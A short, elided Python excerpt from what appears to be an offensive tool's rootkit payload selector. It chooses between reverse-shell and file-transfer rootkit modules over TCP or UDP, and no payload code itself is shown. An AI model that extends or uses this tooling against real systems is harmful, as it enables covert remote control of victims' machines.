...
def get_rootkit():
    ...
    if choice == "000":
        ...
        if victim_os == "000":
            ...
            if r_type == '1':
                if choice == 'TCP':
                    import core.lib._payloads.rootkit.reverse_tcp as r # pylint: disable=C0415; # noqa
                elif choice == 'UDP':
                    import core.lib._payloads.rootkit.reverse_udp as r # pylint: disable=C0415; # noqa
            elif r_type == '2':
                if choice == 'TCP':
                    import core.lib._payloads.rootkit.ft_tcp as r # pylint: disable=C0415; # noqa
                elif choice == 'UDP':
                    import core.lib._payloads.rootkit.ft_udp as r # pylint: disable=C0415; # noqa
